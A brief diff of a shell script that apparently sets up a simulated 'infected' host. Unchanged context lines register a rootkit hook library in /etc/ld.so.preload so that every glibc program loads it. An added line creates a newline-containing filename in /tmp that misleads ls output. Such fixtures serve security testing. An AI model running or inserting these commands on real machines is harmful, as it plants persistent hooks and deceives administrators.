@@ -19,4 +19,6 @@ if [ "$1" = infected ]; then
   # Last: from here on every glibc program loads the hook.
   echo /usr/lib/rk_hook.so > /etc/ld.so.preload
 fi
+# Any local user can create a name with a newline; ls prints it as two lines.
+touch "$(printf '/tmp/innocent\nname')"
 cd /var/www/html && wp-agent
